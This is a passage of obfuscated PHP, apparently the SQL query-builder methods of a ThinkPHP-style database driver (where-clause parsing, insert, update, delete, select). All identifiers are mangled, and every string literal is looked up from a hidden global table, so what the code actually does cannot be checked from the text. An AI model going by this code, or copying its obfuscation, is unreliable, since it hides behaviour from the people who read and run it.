$›×Œè¿ö => $ø€û˜) { if (is_array($ø€û˜) && $µÀŞÎÒ[306] == $ø€û˜[0]) { $Î–šÄà[] = $this->parseKey($›×Œè¿ö) . $µÀŞÎÒ[892] . $ø€û˜[1]; } elseif (is_scalar($ø€û˜) || is_null($ø€û˜)) { $Î–šÄà[] = $this->parseKey($›×Œè¿ö) . $µÀŞÎÒ[892] . $this->parseValue($ø€û˜); } } return $µÀŞÎÒ[1003] . implode($µÀŞÎÒ[50], $Î–šÄà); } protected function bindParam($’ÌşÊ‹ñ, $ŠÈÚ½Ù) { $this->bind[$_SERVER[™¾ÇÙ¯¹][4] . $’ÌşÊ‹ñ] = $ŠÈÚ½Ù; } protected function parseBind($Í‘Ç÷÷Æ) { $Í‘Ç÷÷Æ = array_merge($this->bind, $Í‘Ç÷÷Æ); $this->bind = array(); return $Í‘Ç÷÷Æ; } function parseKey(&$Îİ¡ïÇÁ, $Ò•”ò¬Ğ = true) { if ($Ò•”ò¬Ğ) { $Îİ¡ïÇÁ = $this->parseKeyCheck($Îİ¡ïÇÁ); } return $Îİ¡ïÇÁ; } function parseKeyCheck($Ö‰ÁÄÆ‡) { $“„Æ¡©û =& $_SERVER[™¾ÇÙ¯¹]; $Ö‰ÁÄÆ‡ = trim($Ö‰ÁÄÆ‡); if (!preg_match($“„Æ¡©û[1004], $Ö‰ÁÄÆ‡)) { think_exception($“„Æ¡©û[1005] . $Ö‰ÁÄÆ‡); } return $Ö‰ÁÄÆ‡; } protected function parseValue($“ˆ÷ó›·) { $„äıĞÖ› =& $_SERVER[™¾ÇÙ¯¹]; if (is_string($“ˆ÷ó›·)) { $“ˆ÷ó›· = $„äıĞÖ›[965] . $this->escapeString($“ˆ÷ó›·) . $„äıĞÖ›[965]; } elseif (isset($“ˆ÷ó›·[0]) && is_string($“ˆ÷ó›·[0]) && strtolower($“ˆ÷ó›·[0]) == $„äıĞÖ›[306]) { $“ˆ÷ó›· = $this->escapeString($“ˆ÷ó›·[1]); } elseif (is_array($“ˆ÷ó›·)) { $“ˆ÷ó›· = array_map(array($this, $„äıĞÖ›[966]), $“ˆ÷ó›·); } elseif (is_bool($“ˆ÷ó›·)) { $“ˆ÷ó›· = $“ˆ÷ó›· ? $„äıĞÖ›[88] : $„äıĞÖ›[197]; } elseif (is_null($“ˆ÷ó›·)) { $“ˆ÷ó›· = $„äıĞÖ›[103]; } return $“ˆ÷ó›·; } protected function parseField($ñ’ŸÙÌİ) { $Î°¥µ =& $_SERVER[™¾ÇÙ¯¹]; if (is_string($ñ’ŸÙÌİ) && strpos($ñ’ŸÙÌİ, $Î°¥µ[50])) { $ñ’ŸÙÌİ = explode($Î°¥µ[50], $ñ’ŸÙÌİ); } if (is_array($ñ’ŸÙÌİ)) { $¥Õ¤Êõ = array(); foreach ($ñ’ŸÙÌİ as $ş¥½ÓÉ² => $‹Ş¼ÍÔÅ) { if (!is_numeric($ş¥½ÓÉ²)) { $¥Õ¤Êõ[] = $this->parseKey($ş¥½ÓÉ², !1) . $Î°¥µ[1006] . $this->parseKey($‹Ş¼ÍÔÅ); } else { $¥Õ¤Êõ[] = $this->parseKey($‹Ş¼ÍÔÅ); } } $§Áö´ó = implode($Î°¥µ[50], $¥Õ¤Êõ); } elseif (is_string($ñ’ŸÙÌİ) && !empty($ñ’ŸÙÌİ)) { $§Áö´ó = $ñ’ŸÙÌİ; } else { $§Áö´ó = $Î°¥µ[188]; } return $§Áö´ó; } protected function parseTable($û¦æùÙí) { $©İê²¢ö =& $_SERVER[™¾ÇÙ¯¹]; if (is_array($û¦æùÙí)) { $åûæœ³¸ = array(); foreach ($û¦æùÙí as $ÄİŞ§‡ => $Õ¬ç‰Íõ) { if (!is_numeric($ÄİŞ§‡)) { $åûæœ³¸[] = $this->parseKey($ÄİŞ§‡) . $©İê²¢ö[53] . $this->parseKey($Õ¬ç‰Íõ); } else { $åûæœ³¸[] = $this->parseKey($ÄİŞ§‡); } } $û¦æùÙí = $åûæœ³¸; } elseif (is_string($û¦æùÙí)) { if (strstr($û¦æùÙí, $©İê²¢ö[53])) { return $û¦æùÙí; } $û¦æùÙí = explode($©İê²¢ö[50], $û¦æùÙí); array_walk($û¦æùÙí, array($this, $©İê²¢ö[914])); } return $©İê²¢ö[908] . trim(implode($©İê²¢ö[1007], $û¦æùÙí), $©İê²¢ö[393]) . $©İê²¢ö[908]; } protected function parseWhere($éØøâ Ø) { $ñ˜¼ôîÀ =& $_SERVER[™¾ÇÙ¯¹]; $€›åÉÃÔ = $ñ˜¼ôîÀ[12]; if (is_string($éØøâ Ø)) { $€›åÉÃÔ = $éØøâ Ø; } else { $«ÀÆÏÑø = isset($éØøâ Ø[$ñ˜¼ôîÀ[1008]]) ? strtoupper($éØøâ Ø[$ñ˜¼ôîÀ[1008]]) : $ñ˜¼ôîÀ[12]; if (in_array($«ÀÆÏÑø, array($ñ˜¼ôîÀ[1009], $ñ˜¼ôîÀ[1010], $ñ˜¼ôîÀ[1011]))) { $«ÀÆÏÑø = $ñ˜¼ôîÀ[53] . $«ÀÆÏÑø . $ñ˜¼ôîÀ[53]; unset($éØøâ Ø[$ñ˜¼ôîÀ[1008]]); } else { $«ÀÆÏÑø = $ñ˜¼ôîÀ[1012]; } foreach ($éØøâ Ø as $åÕŒã„è => $İ©Ä©´Í) { $€›åÉÃÔ .= $ñ˜¼ôîÀ[286]; if (is_numeric($åÕŒã„è)) { $åÕŒã„è = $ñ˜¼ôîÀ[1013]; } if (0 === strpos($åÕŒã„è, $ñ˜¼ôîÀ[11])) { $€›åÉÃÔ .= $this->parseThinkWhere($åÕŒã„è, $İ©Ä©´Í); } else { if (!preg_match($ñ˜¼ôîÀ[1014], trim($åÕŒã„è))) { think_exception(think_lang($ñ˜¼ôîÀ[1015]) . $ñ˜¼ôîÀ[4] . $åÕŒã„è); } $½™ÊüÑ† = is_array($İ©Ä©´Í) && isset($İ©Ä©´Í[$ñ˜¼ôîÀ[1016]]); $åÕŒã„è = trim($åÕŒã„è); if (strpos($åÕŒã„è, $ñ˜¼ôîÀ[292])) { $ù¶èŒÇ… = explode($ñ˜¼ôîÀ[292], $åÕŒã„è); $ÀÂ§Çƒş = array(); foreach ($ù¶èŒÇ… as $¥ñÒÓ€Î => $é… ’Î) { $ıæ×¬¾¸ = $½™ÊüÑ† ? $İ©Ä©´Í[$¥ñÒÓ€Î] : $İ©Ä©´Í; $ÀÂ§Çƒş[] = $ñ˜¼ôîÀ[269] . $this->parseWhereItem($this->parseKey($é… ’Î), $ıæ×¬¾¸) . $ñ˜¼ôîÀ[913]; } $€›åÉÃÔ .= implode($ñ˜¼ôîÀ[1017], $ÀÂ§Çƒş); } elseif (strpos($åÕŒã„è, $ñ˜¼ôîÀ[293])) { $ù¶èŒÇ… = explode($ñ˜¼ôîÀ[293], $åÕŒã„è); $ÀÂ§Çƒş = array(); foreach ($ù¶èŒÇ… as $¥ñÒÓ€Î => $é… ’Î) { $ıæ×¬¾¸ = $½™ÊüÑ† ? $İ©Ä©´Í[$¥ñÒÓ€Î] : $İ©Ä©´Í; $ÀÂ§Çƒş[] = $ñ˜¼ôîÀ[269] . $this->parseWhereItem($this->parseKey($é… ’Î), $ıæ×¬¾¸) . $ñ˜¼ôîÀ[913]; } $€›åÉÃÔ .= implode($ñ˜¼ôîÀ[1012], $ÀÂ§Çƒş); } else { $€›åÉÃÔ .= $this->parseWhereItem($this->parseKey($åÕŒã„è), $İ©Ä©´Í); } } $€›åÉÃÔ .= $ñ˜¼ôîÀ[287] . $«ÀÆÏÑø; } $€›åÉÃÔ = substr($€›åÉÃÔ, 0, -strlen($«ÀÆÏÑø)); } return empty($€›åÉÃÔ) ? $ñ˜¼ôîÀ[12] : $ñ˜¼ôîÀ[1018] . $€›åÉÃÔ; } protected function parseWhereItem($¢ªµæ¯ä, $§¦ƒóåû) { $Ãà¦¨Ä =& $_SERVER[™¾ÇÙ¯¹]; $ˆ­îˆÎ = $Ãà¦¨Ä[12]; if (is_array($§¦ƒóåû)) { if (is_string($§¦ƒóåû[0])) { $ê—»ìÂ« = strtolower($§¦ƒóåû[0]); if (in_array($§¦ƒóåû[0], array($Ãà¦¨Ä[892], $Ãà¦¨Ä[1019], $Ãà¦¨Ä[1020], $Ãà¦¨Ä[1021], $Ãà¦¨Ä[1022], $Ãà¦¨Ä[1023]))) { $ˆ­îˆÎ .= $¢ªµæ¯ä . $Ãà¦¨Ä[53] . $§¦ƒóåû[0] . $Ãà¦¨Ä[53] . $this->parseValue($§¦ƒóåû[1]); } elseif (preg_match($Ãà¦¨Ä[1024], $§¦ƒóåû[0])) { $ˆ­îˆÎ .= $¢ªµæ¯ä . $Ãà¦¨Ä[53] . $this->exp[$ê—»ìÂ«] . $Ãà¦¨Ä[53] . $this->parseValue($§¦ƒóåû[1]); } elseif (preg_match($Ãà¦¨Ä[1025], $§¦ƒóåû[0])) { if (is_array($§¦ƒóåû[1])) { $«·™Æõ = isset($§¦ƒóåû[2]) ? strtoupper($§¦ƒóåû[2]) : $Ãà¦¨Ä[1010]; if (in_array($«·™Æõ, array($Ãà¦¨Ä[1009], $Ãà¦¨Ä[1010], $Ãà¦¨Ä[1011]))) { $¬ïÚÇŒ = array(); foreach ($§¦ƒóåû[1] as $ñÏ›â•) { $¬ïÚÇŒ[] = $¢ªµæ¯ä . $Ãà¦¨Ä[53] . $this->exp[$ê—»ìÂ«] . $Ãà¦¨Ä[53] . $this->parseValue($ñÏ›â•); } $ˆ­îˆÎ .= $Ãà¦¨Ä[269] . implode($Ãà¦¨Ä[53] . $«·™Æõ . $Ãà¦¨Ä[53], $¬ïÚÇŒ) . $Ãà¦¨Ä[913]; } } else { $ˆ­îˆÎ .= $¢ªµæ¯ä . $Ãà¦¨Ä[53] . $this->exp[$ê—»ìÂ«] . $Ãà¦¨Ä[53] . $this->parseValue($§¦ƒóåû[1]); } } elseif ($Ãà¦¨Ä[306] == $ê—»ìÂ«) { $ˆ­îˆÎ .= $Ãà¦¨Ä[911] . $¢ªµæ¯ä . $Ãà¦¨Ä[53] . $§¦ƒóåû[1] . $Ãà¦¨Ä[1026]; } elseif (preg_match($Ãà¦¨Ä[1027], $§¦ƒóåû[0])) { $ˆ­îˆÎ .= $§¦ƒóåû[0]; } elseif (preg_match($Ãà¦¨Ä[1028], $§¦ƒóåû[0])) { if (isset($§¦ƒóåû[2]) && $Ãà¦¨Ä[306] == $§¦ƒóåû[2]) { $ˆ­îˆÎ .= $¢ªµæ¯ä . $Ãà¦¨Ä[53] . $this->exp[$ê—»ìÂ«] . $Ãà¦¨Ä[53] . $§¦ƒóåû[1]; } else { if (is_string($§¦ƒóåû[1])) { $§¦ƒóåû[1] = explode($Ãà¦¨Ä[50], $§¦ƒóåû[1]); } $İŒŒ»¶ = implode($Ãà¦¨Ä[50], $this->parseValue($§¦ƒóåû[1])); $ˆ­îˆÎ .= $¢ªµæ¯ä . $Ãà¦¨Ä[53] . $this->exp[$ê—»ìÂ«] . $Ãà¦¨Ä[911] . $İŒŒ»¶ . $Ãà¦¨Ä[913]; } } elseif (preg_match($Ãà¦¨Ä[1029], $§¦ƒóåû[0])) { $´‹ó²Ó· = is_string($§¦ƒóåû[1]) ? explode($Ãà¦¨Ä[50], $§¦ƒóåû[1]) : $§¦ƒóåû[1]; $ˆ­îˆÎ .= $Ãà¦¨Ä[911] . $¢ªµæ¯ä . $Ãà¦¨Ä[53] . $this->exp[$ê—»ìÂ«] . $Ãà¦¨Ä[53] . $this->parseValue($´‹ó²Ó·[0]) . $Ãà¦¨Ä[1012] . $this->parseValue($´‹ó²Ó·[1]) . $Ãà¦¨Ä[287]; } else { think_exception(think_lang($Ãà¦¨Ä[1015]) . $Ãà¦¨Ä[4] . $§¦ƒóåû[0]); } } else { $¾‚àê° = count($§¦ƒóåû); $¶Ù¼ùóÃ = $Ãà¦¨Ä[12]; if (is_string($§¦ƒóåû[$¾‚àê° - 1])) { $¶Ù¼ùóÃ = isset($§¦ƒóåû[$¾‚àê° - 1]) ? strtoupper($§¦ƒóåû[$¾‚àê° - 1]) : $Ãà¦¨Ä[12]; if (in_array($¶Ù¼ùóÃ, array($Ãà¦¨Ä[1009], $Ãà¦¨Ä[1010], $Ãà¦¨Ä[1011]))) { $¾‚àê° = $¾‚àê° - 1; } } else { $¶Ù¼ùóÃ = $Ãà¦¨Ä[1009]; } for ($Ë¬Ñ¦—Æ = 0; $Ë¬Ñ¦—Æ < $¾‚àê°; $Ë¬Ñ¦—Æ++) { $´‹ó²Ó· = is_array($§¦ƒóåû[$Ë¬Ñ¦—Æ]) ? $§¦ƒóåû[$Ë¬Ñ¦—Æ][1] : $§¦ƒóåû[$Ë¬Ñ¦—Æ]; if ($Ãà¦¨Ä[306] == strtolower($§¦ƒóåû[$Ë¬Ñ¦—Æ][0])) { $ˆ­îˆÎ .= $Ãà¦¨Ä[269] . $¢ªµæ¯ä . $Ãà¦¨Ä[53] . $´‹ó²Ó· . $Ãà¦¨Ä[1026] . $¶Ù¼ùóÃ . $Ãà¦¨Ä[53]; } else { $Ù¸ˆ¥¡ = is_array($§¦ƒóåû[$Ë¬Ñ¦—Æ]) ? $this->exp[strtolower($§¦ƒóåû[$Ë¬Ñ¦—Æ][0])] : $Ãà¦¨Ä[892]; if (!$Ù¸ˆ¥¡ && is_array($§¦ƒóåû[$Ë¬Ñ¦—Æ]) && in_array($§¦ƒóåû[$Ë¬Ñ¦—Æ][0], array($Ãà¦¨Ä[892], $Ãà¦¨Ä[1019], $Ãà¦¨Ä[1020], $Ãà¦¨Ä[1021], $Ãà¦¨Ä[1022], $Ãà¦¨Ä[1023]))) { $Ù¸ˆ¥¡ = $§¦ƒóåû[$Ë¬Ñ¦—Æ][0]; } $ˆ­îˆÎ .= $Ãà¦¨Ä[269] . $¢ªµæ¯ä . $Ãà¦¨Ä[53] . $Ù¸ˆ¥¡ . $Ãà¦¨Ä[53] . $this->parseValue($´‹ó²Ó·) . $Ãà¦¨Ä[1026] . $¶Ù¼ùóÃ . $Ãà¦¨Ä[53]; } } $ˆ­îˆÎ = substr($ˆ­îˆÎ, 0, -4); } } else { $ˆ­îˆÎ .= $¢ªµæ¯ä . $Ãà¦¨Ä[1030] . $this->parseValue($§¦ƒóåû); } return $ˆ­îˆÎ; } protected function parseThinkWhere($ßçìÅÆã, $Æ¢ış•µ) { $ä­¼ˆÎ× =& $_SERVER[™¾ÇÙ¯¹]; $ıŒ¿šñ¥ = $ä­¼ˆÎ×[12]; switch ($ßçìÅÆã) { case $ä­¼ˆÎ×[361]: $ıŒ¿šñ¥ = $Æ¢ış•µ; break; case $ä­¼ˆÎ×[1013]: $ıŒ¿šñ¥ = is_string($Æ¢ış•µ) ? $Æ¢ış•µ : substr($this->parseWhere($Æ¢ış•µ), 6); break; case $ä­¼ˆÎ×[1031]: parse_str($Æ¢ış•µ, $“­¼Ã®); if (isset($“­¼Ã®[$ä­¼ˆÎ×[1008]])) { $„–›ìíå = $ä­¼ˆÎ×[53] . strtoupper($“­¼Ã®[$ä­¼ˆÎ×[1008]]) . $ä­¼ˆÎ×[53]; unset($“­¼Ã®[$ä­¼ˆÎ×[1008]]); } else { $„–›ìíå = $ä­¼ˆÎ×[1012]; } $ºùú© = array(); foreach ($“­¼Ã® as $Óğ˜Åú => $ƒÓÊÚşè) { $ºùú©[] = $this->parseKey($Óğ˜Åú) . $ä­¼ˆÎ×[1030] . $this->parseValue($ƒÓÊÚşè); } $ıŒ¿šñ¥ = implode($„–›ìíå, $ºùú©); break; } return $ıŒ¿šñ¥; } protected function parseLimit($„ÍÃûÌË) { $Öå¼®½Õ =& $_SERVER[™¾ÇÙ¯¹]; return !empty($„ÍÃûÌË) ? $Öå¼®½Õ[51] . $„ÍÃûÌË . $Öå¼®½Õ[53] : $Öå¼®½Õ[12]; } protected function parseJoin($šó™µã‡) { $²‹Øø±  =& $_SERVER[™¾ÇÙ¯¹]; $ğÇŒÂ¦— = $²‹Øø± [12]; if (!empty($šó™µã‡)) { if (is_array($šó™µã‡)) { foreach ($šó™µã‡ as $Á²ÃÈé => $İšàè©) { if (!1 !== stripos($İšàè©, $²‹Øø± [1032])) { $ğÇŒÂ¦— .= $²‹Øø± [53] . $İšàè©; } else { $ğÇŒÂ¦— .= $²‹Øø± [1033] . $İšàè©; } } } else { $ğÇŒÂ¦— .= $²‹Øø± [1033] . $šó™µã‡; } } $ğÇŒÂ¦— = preg_replace($²‹Øø± [1034], think_config($²‹Øø± [938]) . $²‹Øø± [1035], $ğÇŒÂ¦—); return $ğÇŒÂ¦—; } protected function parseOrder($‘±¹×É) { $Ÿ‚¶®û =& $_SERVER[™¾ÇÙ¯¹]; if (is_array($‘±¹×É)) { $Ã¶†ŒÈæ = array(); foreach ($‘±¹×É as $âãÄì›â => $½‡¥¨ÌÓ) { if (is_numeric($âãÄì›â)) { $Ã¶†ŒÈæ[] = $this->parseKey($½‡¥¨ÌÓ); } else { $½‡¥¨ÌÓ = in_array(strtoupper(trim($½‡¥¨ÌÓ)), array($Ÿ‚¶®û[1036], $Ÿ‚¶®û[1037])) ? $Ÿ‚¶®û[53] . $½‡¥¨ÌÓ : $Ÿ‚¶®û[12]; if (preg_match($Ÿ‚¶®û[1038], $âãÄì›â)) { $Ã¶†ŒÈæ[] = $this->parseKey($âãÄì›â) . $½‡¥¨ÌÓ; } else { think_exception($Ÿ‚¶®û[1039] . $âãÄì›â); } } } $‘±¹×É = implode($Ÿ‚¶®û[50], $Ã¶†ŒÈæ); } return !empty($‘±¹×É) ? $Ÿ‚¶®û[1040] . $‘±¹×É : $Ÿ‚¶®û[12]; } protected function parseGroup($ °´‰‰) { $õºêÎ©— =& $_SERVER[™¾ÇÙ¯¹]; return !empty($ °´‰‰) ? $õºêÎ©—[1041] . $ °´‰‰ : $õºêÎ©—[12]; } protected function parseHaving($×“›„â) { $ô«ˆ ¿ =& $_SERVER[™¾ÇÙ¯¹]; return !empty($×“›„â) ? $ô«ˆ ¿[1042] . $×“›„â : $ô«ˆ ¿[12]; } protected function parseComment($²ÎùÖÀ¨) { $§ãš¦¤å =& $_SERVER[™¾ÇÙ¯¹]; return !empty($²ÎùÖÀ¨) ? $§ãš¦¤å[1043] . $²ÎùÖÀ¨ . $§ãš¦¤å[1044] : $§ãš¦¤å[12]; } protected function parseDistinct($ØÃ«¯±Ã) { $ˆæ•ÍŒù =& $_SERVER[™¾ÇÙ¯¹]; return !empty($ØÃ«¯±Ã) ? $ˆæ•ÍŒù[1045] : $ˆæ•ÍŒù[12]; } protected function parseUnion($æ²œÁ”Æ) { $º•ç´ç¿ =& $_SERVER[™¾ÇÙ¯¹]; if (empty($æ²œÁ”Æ)) { return $º•ç´ç¿[12]; } if (isset($æ²œÁ”Æ[$º•ç´ç¿[357]])) { $èà“ğª‰ = $º•ç´ç¿[1046]; unset($æ²œÁ”Æ[$º•ç´ç¿[357]]); } else { $èà“ğª‰ = $º•ç´ç¿[1047]; } foreach ($æ²œÁ”Æ as $¬áíñ¢Ù) { $¸Ãß„üÛ[] = $èà“ğª‰ . (is_array($¬áíñ¢Ù) ? $this->buildSelectSql($¬áíñ¢Ù) : $¬áíñ¢Ù); } return implode($º•ç´ç¿[53], $¸Ãß„üÛ); } public function insert($œ©Ï¡şğ, $Ÿ½æáéó = array(), $ä¥áªçİ = false) { $ÂîØáñ» =& $_SERVER[™¾ÇÙ¯¹]; $“Ğë¦¸¯ = $ÁµŸóÖƒ = array(); $this->model = $Ÿ½æáéó[$ÂîØáñ»[290]]; foreach ($œ©Ï¡şğ as $«—­Ìœ¤ => $ºÌİÂ×Œ) { if (is_array($ºÌİÂ×Œ) && $ÂîØáñ»[306] == $ºÌİÂ×Œ[0]) { $ÁµŸóÖƒ[] = $this->parseKey($«—­Ìœ¤); $“Ğë¦¸¯[] = $ºÌİÂ×Œ[1]; } elseif (is_scalar($ºÌİÂ×Œ) || is_null($ºÌİÂ×Œ)) { $ÁµŸóÖƒ[] = $this->parseKey($«—­Ìœ¤); $“Ğë¦¸¯[] = $this->parseValue($ºÌİÂ×Œ); } } $§–¬¼˜ç = ($ä¥áªçİ ? $ÂîØáñ»[915] : $ÂîØáñ»[916]) . $ÂîØáñ»[917] . $this->parseTable($Ÿ½æáéó[$ÂîØáñ»[288]]) . $ÂîØáñ»[911] . implode($ÂîØáñ»[50], $ÁµŸóÖƒ) . $ÂîØáñ»[912] . implode($ÂîØáñ»[50], $“Ğë¦¸¯) . $ÂîØáñ»[913]; $§–¬¼˜ç .= $this->parseLock(isset($Ÿ½æáéó[$ÂîØáñ»[858]]) ? $Ÿ½æáéó[$ÂîØáñ»[858]] : !1); $§–¬¼˜ç .= $this->parseComment(!empty($Ÿ½æáéó[$ÂîØáñ»[363]]) ? $Ÿ½æáéó[$ÂîØáñ»[363]] : $ÂîØáñ»[12]); return $this->execute($§–¬¼˜ç, $this->parseBind(!empty($Ÿ½æáéó[$ÂîØáñ»[294]]) ? $Ÿ½æáéó[$ÂîØáñ»[294]] : array())); } public function selectInsert($Âääô¢¶, $»æı¬ü, $”´èƒî‡ = array()) { $Úú‡áŸ =& $_SERVER[™¾ÇÙ¯¹]; $this->model = $”´èƒî‡[$Úú‡áŸ[290]]; if (is_string($Âääô¢¶)) { $Âääô¢¶ = explode($Úú‡áŸ[50], $Âääô¢¶); } array_walk($Âääô¢¶, array($this, $Úú‡áŸ[914])); $èõÖÎ¿‹ = $Úú‡áŸ[1048] . $this->parseTable($»æı¬ü) . $Úú‡áŸ[911] . implode($Úú‡áŸ[50], $Âääô¢¶) . $Úú‡áŸ[1026]; $èõÖÎ¿‹ .= $this->buildSelectSql($”´èƒî‡); return $this->execute($èõÖÎ¿‹, $this->parseBind(!empty($”´èƒî‡[$Úú‡áŸ[294]]) ? $”´èƒî‡[$Úú‡áŸ[294]] : array())); } public function update($Ì²º‡, $ºÒö˜õş) { $Í¬ªôîŞ =& $_SERVER[™¾ÇÙ¯¹]; $this->model = $ºÒö˜õş[$Í¬ªôîŞ[290]]; $¬ß–¯‰œ = $Í¬ªôîŞ[1049] . $this->parseTable($ºÒö˜õş[$Í¬ªôîŞ[288]]) . $this->parseSet($Ì²º‡) . $this->parseWhere(!empty($ºÒö˜õş[$Í¬ªôîŞ[284]]) ? $ºÒö˜õş[$Í¬ªôîŞ[284]] : $Í¬ªôîŞ[12]) . $this->parseOrder(!empty($ºÒö˜õş[$Í¬ªôîŞ[374]]) ? $ºÒö˜õş[$Í¬ªôîŞ[374]] : $Í¬ªôîŞ[12]) . $this->parseLimit(!empty($ºÒö˜õş[$Í¬ªôîŞ[301]]) ? $ºÒö˜õş[$Í¬ªôîŞ[301]] : $Í¬ªôîŞ[12]) . $this->parseLock(isset($ºÒö˜õş[$Í¬ªôîŞ[858]]) ? $ºÒö˜õş[$Í¬ªôîŞ[858]] : !1) . $this->parseComment(!empty($ºÒö˜õş[$Í¬ªôîŞ[363]]) ? $ºÒö˜õş[$Í¬ªôîŞ[363]] : $Í¬ªôîŞ[12]); return $this->execute($¬ß–¯‰œ, $this->parseBind(!empty($ºÒö˜õş[$Í¬ªôîŞ[294]]) ? $ºÒö˜õş[$Í¬ªôîŞ[294]] : array())); } public function delete($Ğ˜È¼ÊÄ = array()) { $ÏÀÙåÄ• =& $_SERVER[™¾ÇÙ¯¹]; $this->model = $Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[290]]; $÷ ¿ÙÒ = $ÏÀÙåÄ•[1050] . $this->parseTable($Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[288]]) . $this->parseWhere(!empty($Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[284]]) ? $Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[284]] : $ÏÀÙåÄ•[12]) . $this->parseOrder(!empty($Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[374]]) ? $Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[374]] : $ÏÀÙåÄ•[12]) . $this->parseLimit(!empty($Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[301]]) ? $Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[301]] : $ÏÀÙåÄ•[12]) . $this->parseLock(isset($Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[858]]) ? $Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[858]] : !1) . $this->parseComment(!empty($Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[363]]) ? $Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[363]] : $ÏÀÙåÄ•[12]); return $this->execute($÷ ¿ÙÒ, $this->parseBind(!empty($Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[294]]) ? $Ğ˜È¼ÊÄ[$ÏÀÙåÄ•[294]] : array())); } public function select($­İ‰æ„â = array()) { $´¸™İ€Û =& $_SERVER[™¾ÇÙ¯¹]; $this->model = $­İ‰æ„â[$´¸™İ€Û[290]]; $–ËÜ‡è® = $this->buildSelectSql($­İ‰æ„â); $®†äñŞ¥ = isset($­İ‰æ„â[$´¸™İ€Û[358]]) ? $­İ‰æ„â[$´¸™İ€Û[358]] : !1; if ($®†äñŞ¥) { $åØÎÕ® = is_string($®†äñŞ¥[$´¸™İ€Û[94]]) ? $®†äñŞ¥[$´¸™İ€Û[94]] : $´¸™İ€Û[1051] . md5($–ËÜ‡è®); $‘€ğº¤› = think_cache($åØÎÕ®, $´¸™İ€Û[12], $®†äñŞ¥); if (!1 !== $‘€ğº¤›) { return $‘€ğº¤›; } } $Í˜äè²Ø = $this->query($–ËÜ‡è®, $this->parseBind(!empty($­İ‰æ„â[$´¸™İ€Û[294]]) ? $­İ‰æ„â[$´¸™İ€Û[294]] : array())); if ($®†äñŞ¥ && !1 !== $Í˜äè²Ø) { think_cache($åØÎÕ®, $Í˜äè²Ø, $®†äñŞ¥); } return $Í˜äè²Ø; } public function buildSelectSql($øöØ¨Ù = array()) { $´ÈÕ¹¥İ =& $_SERVER[™¾ÇÙ¯¹]; if (isset($øöØ¨Ù[$´ÈÕ¹¥İ[362]])) { if (strpos($øöØ¨Ù[$´ÈÕ¹¥İ[362]], $´ÈÕ¹¥İ[50])) { list($¬Å„ŞÏ, $“«™œÇï) = explode($´ÈÕ¹¥İ[50], $øöØ¨Ù[$´ÈÕ¹¥İ[362]]); } else { $¬Å„ŞÏ = $øöØ¨Ù[$´ÈÕ¹¥İ[362]]; } $¬Å„ŞÏ = $¬Å„ŞÏ ? $¬Å„ŞÏ : 1; $“«™œÇï = isset($“«™œÇï) ? $“«™œÇï : (is_numeric($øöØ¨Ù[$´ÈÕ¹¥İ[301]]) ? $øöØ¨Ù[$´ÈÕ¹¥İ[301]] : 20); $Ê¸äÂİ€ = $“«™œÇï * ((int) $¬Å„ŞÏ - 1); $øöØ¨Ù[$´ÈÕ¹¥İ[301]] = $Ê¸äÂİ€ . $´ÈÕ¹¥İ[50] . $“«™œÇï; } if (think_config($´ÈÕ¹¥İ[1052])) { $îçÃôû = $´ÈÕ¹¥İ[1053] . md5(serialize($øöØ¨Ù)); $±ƒÙâ°ó = think_cache($îçÃôû); if ($±ƒÙâ°ó) { return $±ƒÙâ°ó; } } $Ï¿ğ¥üÑ = $this->parseSql($this->selectSql, $øöØ¨Ù); $Ï¿ğ¥üÑ .= $this->parseLock(isset($øöØ¨Ù[$´ÈÕ¹¥İ[858]]) ? $øöØ¨Ù[$´ÈÕ¹¥İ[858]] : !1); if (isset($îçÃôû)) { think_cache($îçÃôû, $Ï¿ğ¥üÑ); } return $Ï¿ğ¥üÑ; } public function parseSql($¢Ÿ¸”µß, $ªÀäÃê€ = array()) { $ø¢“±şã =& $_SERVER[™¾ÇÙ¯¹]; $¢Ÿ¸”µß = str_replace(array($ø¢“±şã[1054], $ø¢“±şã[1055], $ø¢“±şã[1056], $ø¢“±şã[1057], $ø¢“±şã[1058], $ø¢“±şã[1059], $ø¢“±şã[1060], $ø¢“±şã[1061], $ø¢“±şã[1062], $ø¢“±şã[1063], $ø¢“±şã[1064]), array($this->parseTable("{$ªÀäÃê€[$ø¢“±şã[288]]}"), $this->parseDistinct(isset($ªÀäÃê€[$ø¢“±şã[1065]]) ? $ªÀäÃê€[$ø¢“±şã[1065]] : !1), $this->parseField(!empty($ªÀäÃê€[$ø¢“±şã[282]]) ? $ªÀäÃê€[$ø¢“±şã[282]] : $ø¢“±şã[188]), $this->parseJoin(!empty($ªÀäÃê€[$ø¢“±şã[291]]) ? $ªÀäÃê€[$ø¢“±şã[291]] : $ø¢“±şã[12]), $this->parseWhere(!empty($ªÀäÃê€[$ø¢“±şã[284]]) ? $ªÀäÃê€[$ø¢“±şã[284]] : $ø¢“±şã[12]), $this->parseGroup(!empty($ªÀäÃê€[$ø¢“±şã[523]]) ? $ªÀäÃê€[$ø¢“±şã[523]] : $ø¢“±şã[12]), $this->parseHaving(!empty($ªÀäÃê€[$ø¢“±şã[1066]]) ? $ªÀäÃê€[$ø¢“±şã[1066]] : $ø¢“±şã[12]), $this->parseOrder(!empty($ªÀäÃê€[$ø¢“±şã[374]]) ? $ªÀäÃê€[$ø¢“±şã[374]] : $ø¢“±şã[12]), $this->parseLimit(!empty($ªÀäÃê€[$ø¢“±şã[301]]) ? $ªÀäÃê€[$ø¢“±şã[301]] : $ø¢“±şã[12]), $this->parseUnion(!empty($ªÀäÃê€[$ø¢“±şã[356]]) ? $ªÀäÃê€[$ø¢“±şã[356]] : $ø¢“±şã[12]), $this->parseComment(!empty($ªÀäÃê€[$ø¢“±şã[363]]) ? $ªÀäÃê€[$ø¢“±şã[363]] : $ø¢“±şã[12])), $¢Ÿ¸”µß); return $¢Ÿ¸”µß; } public function getLastSql($Ù„ş»“Ú = '') { return $Ù„ş»“Ú ? 